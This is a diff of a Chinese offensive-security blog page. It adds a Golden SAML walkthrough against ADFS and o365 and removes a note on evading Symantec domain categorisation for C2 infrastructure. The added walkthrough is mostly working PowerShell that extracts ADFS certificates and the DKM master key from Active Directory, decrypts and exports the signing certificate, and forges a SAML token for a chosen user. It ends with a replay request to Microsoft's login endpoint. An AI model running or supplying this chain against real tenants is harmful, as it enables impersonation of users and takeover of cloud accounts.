-<h1><span id="在赛门铁克域名分类查看域名情况">在赛门铁克域名分类查看域名情况</span></h1><p>由于我们使用了302跳转，没有托管任何网页在网站上，并且域名时间很短也不是以.com结尾，所有赛门铁克的域名分类可能会将我们的域名认定为可疑的域名，如下：</p>
-<p><img src="/images/99.png" alt="99"></p>
-<p>但是如果我们提交fastly的域名的话就没有这个情况了（可以在一定情况下规避赛门铁克的联网阻断）：<br><img src="/images/100.png" alt="100"></p>
+<p><img src="/images/105.png" alt="105"></p>
+<h1><span id="手动攻击">手动攻击</span></h1><h2><span id="导出adfs配置">导出ADFS配置</span></h2><p>ADFS配置包含了加密的ADFS令牌签名证书和加密的adfs证书，这两个证书可以导出并解密，用于签署 SAML 令牌并在混合环境中冒充用户。</p>
+<p>使用ADFS本地管理员或者ADFS服务账户的身份执行下面的命令获取到加密的证书</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$ADFS</span> = <span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> root/ADFS <span class="literal">-Class</span> SecurityTokenService</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$conn</span> = <span class="variable">$ADFS</span>.ConfigurationDatabaseConnectionString</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$conn</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SQLclient</span> = <span class="built_in">new-object</span> System.Data.SqlClient.SqlConnection <span class="literal">-ArgumentList</span> <span class="variable">$conn</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SQLclient</span>.Open()</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SQLcmd</span> = <span class="variable">$SQLclient</span>.CreateCommand()</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SQLcmd</span>.CommandText = <span class="string">&quot;SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SQLreader</span> = <span class="variable">$SQLcmd</span>.ExecuteReader()</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SQLreader</span>.Read() | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$settings</span>=<span class="variable">$SQLreader</span>.GetTextReader(<span class="number">0</span>).ReadToEnd()</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SQLreader</span>.Dispose()</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$settings</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; [<span class="built_in">xml</span>]<span class="variable">$settingsXML</span> = <span class="variable">$settings</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$settingsXMl</span>.ServiceSettingsData.SecurityTokenService.AdditionalSigningTokens.CertificateReference</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/106.png" alt="106"></p>
+<h2><span id="导出adfs-dkm-master-key">导出ADFS DKM Master key</span></h2><h3><span id="获取-ad-fs-dkm-容器的路径">获取 AD FS DKM 容器的路径</span></h3><p>AD FS 证书使用分布式密钥管理器（DKM）API 加密，并且用于解密证书的 DKM 主密钥存储在域控制器中。当配置主 AD FS 群集时，AD FS DKM 容器会在域控制器中创建，并且 DKM 主密钥作为 AD 联系人对象的属性存储在该容器内部。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$group</span> = <span class="variable">$ServiceSettingsDataPropertyValue</span>.PolicyStore.DkmSettings.Group</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$container</span> = <span class="variable">$ServiceSettingsDataPropertyValue</span>.PolicyStore.DkmSettings.ContainerName</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$parent</span> = <span class="variable">$ServiceSettingsDataPropertyValue</span>.PolicyStore.DkmSettings.ParentContainerDn</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$base</span> = <span class="string">&quot;LDAP://CN=<span class="variable">$group</span>,<span class="variable">$container</span>,<span class="variable">$parent</span>&quot;</span> <span class="comment">#通过隧道执行的话需要在LDAP后面加上DC</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$base</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/107.png" alt="107"></p>
+<h2><span id="获取dkm-key">获取DKM key</span></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$ADSearch</span> = [<span class="type">System.DirectoryServices.DirectorySearcher</span>]::new([<span class="type">System.DirectoryServices.DirectoryEntry</span>]::new(<span class="variable">$ba</span></span><br><span class="line">se))</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$ADSearch</span>.PropertiesToLoad.Add(<span class="string">&quot;thumbnailphoto&quot;</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$ADSearch</span>.Filter=<span class="string">&#x27;(&amp;(objectclass=contact)(!name=CryptoPolicy)(ThumbnailPhoto=*))&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$ADUser</span>=<span class="variable">$ADSearch</span>.FindOne()</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$key</span>=[<span class="built_in">byte</span>[]]<span class="variable">$aduser</span>.Properties[<span class="string">&quot;thumbnailphoto&quot;</span>][<span class="number">0</span>]</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; [<span class="type">System.BitConverter</span>]::ToString(<span class="variable">$key</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/108.png" alt="108"></p>
+<h2><span id="通过dkm-key解密证书并导出">通过DKM key解密证书并导出</span></h2><h3><span id="找证书颁发uri">找证书颁发uri</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Issuer</span> = (<span class="built_in">Get-ADFSProperties</span>).Identifier</span><br></pre></td></tr></table></figure>
+
+
+<h3><span id="获取加密的签名证书">获取加密的签名证书</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; [<span class="built_in">xml</span>]<span class="variable">$xml</span>=<span class="variable">$settings</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$encTokenSigningPfx</span>=<span class="variable">$xml</span>.ServiceSettingsData.SecurityTokenService.AdditionalSigningTokens.CertificateReference.EncryptedPfx</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$encPfxBytes</span>=[<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$encTokenSigningPfx</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$encPfxBytes</span> | <span class="built_in">Format-Hex</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="获取加密的adfs证书">获取加密的ADFS证书</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; [<span class="built_in">xml</span>]<span class="variable">$xml</span>=<span class="variable">$settings</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$encEncryptionPfx</span>=<span class="variable">$xml</span>.ServiceSettingsData.SecurityTokenService.AdditionalEncryptionTokens.CertificateReference.EncryptedPfx</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$encPfxBytes</span>=[<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$encEncryptionPfx</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$encPfxBytes</span> | <span class="built_in">Format-Hex</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="解密证书并导出">解密证书并导出</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$certs</span> = [<span class="type">ordered</span>]<span class="selector-tag">@</span>&#123;&#125;</span><br><span class="line"><span class="variable">$certs</span>[<span class="string">&quot;signing&quot;</span>] =    <span class="variable">$encTokenSigningPfx</span></span><br><span class="line"><span class="variable">$certs</span>[<span class="string">&quot;encryption&quot;</span>] = <span class="variable">$encEncryptionPfx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Iterate over certificate objets</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$certType</span> <span class="keyword">in</span> <span class="variable">$certs</span>.Keys) &#123;</span><br><span class="line">    <span class="variable">$encPfxBytes</span>=[<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$certs</span>[<span class="variable">$certType</span>])</span><br><span class="line">    <span class="variable">$guid</span>=        <span class="variable">$encPfxBytes</span>[<span class="number">8</span><span class="type">..25</span>]  <span class="comment"># 18 bytes</span></span><br><span class="line">    <span class="variable">$KDF_oid</span>=     <span class="variable">$encPfxBytes</span>[<span class="number">26</span><span class="type">..36</span>] <span class="comment"># 11 bytes</span></span><br><span class="line">    <span class="variable">$MAC_oid</span>=     <span class="variable">$encPfxBytes</span>[<span class="number">37</span><span class="type">..47</span>] <span class="comment"># 11 byte</span></span><br><span class="line">    <span class="variable">$enc_oid</span>=     <span class="variable">$encPfxBytes</span>[<span class="number">48</span><span class="type">..58</span>] <span class="comment"># 11 bytes</span></span><br><span class="line">    <span class="variable">$nonce</span>=       <span class="variable">$encPfxBytes</span>[<span class="number">59</span><span class="type">..92</span>] <span class="comment"># 34 bytes</span></span><br><span class="line">    <span class="variable">$iv</span>=          <span class="variable">$encPfxBytes</span>[<span class="number">93</span><span class="type">..110</span>] <span class="comment"># 18 bytes</span></span><br><span class="line">    <span class="variable">$ciphertext</span> = <span class="variable">$encPfxBytes</span>[<span class="number">115</span><span class="type">..</span><span class="variable">$</span>(<span class="variable">$encPfxBytes</span><span class="type">.Length</span>-<span class="number">33</span>)]</span><br><span class="line">    <span class="variable">$cipherMAC</span> =  <span class="variable">$encPfxBytes</span>[<span class="variable">$</span>(<span class="variable">$encPfxBytes</span><span class="type">.Length</span>-<span class="number">32</span>)<span class="type">..</span><span class="variable">$</span>(<span class="variable">$encPfxBytes</span><span class="type">.Length</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create the label</span></span><br><span class="line">    <span class="variable">$label</span> = <span class="variable">$enc_oid</span> + <span class="variable">$MAC_oid</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Derive the decryption key using (almost) standard NIST SP 800-108. The last bit array should be the size of the key in bits, but MS is using bytes (?)</span></span><br><span class="line">    <span class="comment"># As the key size is only 16 bytes (128 bits), no need to loop.</span></span><br><span class="line">    <span class="variable">$hmac</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.HMACSHA256 <span class="literal">-ArgumentList</span> <span class="selector-tag">@</span>(,<span class="variable">$key</span>)</span><br><span class="line">    <span class="variable">$hmacOutput</span> = <span class="variable">$hmac</span>.ComputeHash( <span class="selector-tag">@</span>(<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x01) + <span class="variable">$label</span> + <span class="selector-tag">@</span>(<span class="number">0</span>x00) + <span class="variable">$nonce</span>[<span class="number">2</span><span class="type">..33</span>] + <span class="selector-tag">@</span>(<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x30) )</span><br><span class="line">    <span class="variable">$decryptionKey</span> = <span class="variable">$hmacOutput</span>[<span class="number">0</span><span class="type">..15</span>]</span><br><span class="line">    <span class="built_in">Write-Verbose</span> <span class="string">&quot;Decryption key:&quot;</span></span><br><span class="line">    <span class="built_in">Write-Verbose</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$decryptionKey</span>|Format-Hex)&quot;</span></span><br><span class="line">    <span class="comment"># Create a decryptor and decrypt</span></span><br><span class="line">    <span class="variable">$Crypto</span> = [<span class="type">System.Security.Cryptography.SymmetricAlgorithm</span>]::Create(<span class="string">&quot;AES&quot;</span>)</span><br><span class="line">    <span class="variable">$Crypto</span>.Mode=<span class="string">&quot;CBC&quot;</span></span><br><span class="line">    <span class="variable">$Crypto</span>.KeySize = <span class="number">128</span></span><br><span class="line">    <span class="variable">$Crypto</span>.BlockSize = <span class="number">128</span></span><br><span class="line">    <span class="variable">$Crypto</span>.Padding = <span class="string">&quot;None&quot;</span></span><br><span class="line">    <span class="variable">$Crypto</span>.Key = <span class="variable">$decryptionKey</span></span><br><span class="line">    <span class="variable">$Crypto</span>.IV = <span class="variable">$iv</span>[<span class="number">2</span><span class="type">..17</span>]</span><br><span class="line">    <span class="variable">$decryptor</span> = <span class="variable">$Crypto</span>.CreateDecryptor()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create a memory stream and write the cipher text to it through CryptoStream</span></span><br><span class="line">    <span class="variable">$ms</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream</span><br><span class="line">    <span class="variable">$cs</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.CryptoStream(<span class="variable">$ms</span>,<span class="variable">$decryptor</span>,[<span class="type">System.Security.Cryptography.CryptoStreamMode</span>]::<span class="built_in">Write</span>)</span><br><span class="line">    <span class="variable">$cs</span>.Write(<span class="variable">$ciphertext</span>,<span class="number">0</span>,<span class="variable">$ciphertext</span>.Count)</span><br><span class="line">    <span class="variable">$cs</span>.Close()</span><br><span class="line">    <span class="variable">$cs</span>.Dispose()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get the results</span></span><br><span class="line">    <span class="variable">$decryptedBytes</span> = <span class="variable">$ms</span>.ToArray()</span><br><span class="line">    <span class="variable">$ms</span>.Close()</span><br><span class="line">    <span class="variable">$ms</span>.Dispose()</span><br><span class="line"></span><br><span class="line">    <span class="variable">$CertificatePath</span> = <span class="string">&quot;C:\ProgramData\ADFS_<span class="variable">$</span>(<span class="variable">$certType</span>)_<span class="variable">$</span>(get-date -format yyyy-MM-ddTHHmmssff).pfx&quot;</span></span><br><span class="line">    <span class="variable">$decryptedBytes</span> | <span class="built_in">Set-Content</span> <span class="variable">$CertificatePath</span> <span class="literal">-Encoding</span> Byte</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Get-item</span> <span class="variable">$CertificatePath</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2><span id="使用aadinternals生成一个新的samltoken">使用AADInternals生成一个新的samltoken</span></h2><h3><span id="获取目标用户的guid并base64">获取目标用户的GUID并base64</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$id</span> = (<span class="built_in">Get-ADUser</span> <span class="literal">-LDAPFilter</span> <span class="string">&quot;(samaccountname=123)&quot;</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com).ObjectGUID</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$ImmutableId</span> = [<span class="type">convert</span>]::ToBase64String(([<span class="type">guid</span>]<span class="variable">$id</span>).ToByteArray())</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$ImmutableId</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/109.png" alt="109"></p>
+<h3><span id="生成token">生成token</span></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Cert</span> = <span class="string">&quot;C:\Users\admin\Desktop\123123.pfx&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Issuer</span> = <span class="string">&quot;http://adfs.123.com/adfs/services/trust&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SamlToken</span> = <span class="built_in">New-AADIntSAMLToken</span> <span class="literal">-ImmutableID</span> <span class="variable">$ImmutableId</span> <span class="literal">-PfxFileName</span> <span class="variable">$Cert</span> <span class="literal">-PfxPassword</span> <span class="string">&quot;&quot;</span> <span class="literal">-Issuer</span> <span class="variable">$Issuer</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SamlToken</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="通过网页进行访问">通过网页进行访问</span></h2><p>在下面的wresult处填入saml token，注意要url编码，然后通过burp重放，就可以访问到o365了</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /login.srf HTTP/<span class="number">1.1</span></span><br><span class="line">Host: login.microsoftonline.com</span><br><span class="line">Connection: close</span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">7962</span></span><br><span class="line">Cache<span class="literal">-Control</span>: max<span class="literal">-age</span>=<span class="number">0</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">Content<span class="literal">-Type</span>: application/x<span class="literal">-www-form-urlencoded</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">87.0</span>.<span class="number">4280.88</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Accept<span class="literal">-Language</span>: en<span class="literal">-GB</span>,en<span class="literal">-US</span>;q=<span class="number">0.9</span>,en;q=<span class="number">0.8</span></span><br><span class="line">DNT: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">wa=wsignin1.<span class="number">0</span>&amp;wresult=</span><br></pre></td></tr></table></figure>
+
+<h1><span id="其他利用方法">其他利用方法</span></h1><p><a target="_blank" rel="noopener" href="https://aadinternals.com/post/adfs/">https://aadinternals.com/post/adfs/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/HackTricks-wiki/hacktricks-cloud/blob/master/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/federation.md">https://github.com/HackTricks-wiki/hacktricks-cloud/blob/master/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/federation.md</a></p>
+<p>曾经有人说其实渗透这个东西拼的就是积累，我想也是，下面这三个网站足以覆盖大部分的渗透工作了，不会的，记不得的基本上都可以找到</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.hacktricks.xyz/">https://cloud.hacktricks.xyz/</a></p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></p>
+<p><a target="_blank" rel="noopener" href="https://swisskyrepo.github.io/InternalAllTheThings/">https://swisskyrepo.github.io/InternalAllTheThings/</a></p>
 
 	
 	</div>
-  <a type="button" href="/2024/12/20/C2基础设施搭建/#more" class="btn btn-default more">Read More</a>
+  <a type="button" href="/2024/12/25/o365 & Azure-GoldenSAML/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -400,6 +243,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2025/03/08/一次典型的AWS渗透/" ><i class="fa fa-file-o"></i>一次典型的AWS渗透</a>
+      </li>
+    
+      <li>
         <a href="/2024/12/25/o365 &amp; Azure-GoldenSAML/" ><i class="fa fa-file-o"></i>o365 &amp; Azure-GoldenSAML</a>
       </li>
     
@@ -413,10 +260,6 @@
     
       <li>
         <a href="/2024/12/03/AD-NTLM Relay/" ><i class="fa fa-file-o"></i>AD-NTLM Relay</a>
-      </li>
-    
-      <li>
-        <a href="/2024/12/01/AD-滥用DACL/" ><i class="fa fa-file-o"></i>AD-滥用DACL</a>
       </li>
     
   </ul>
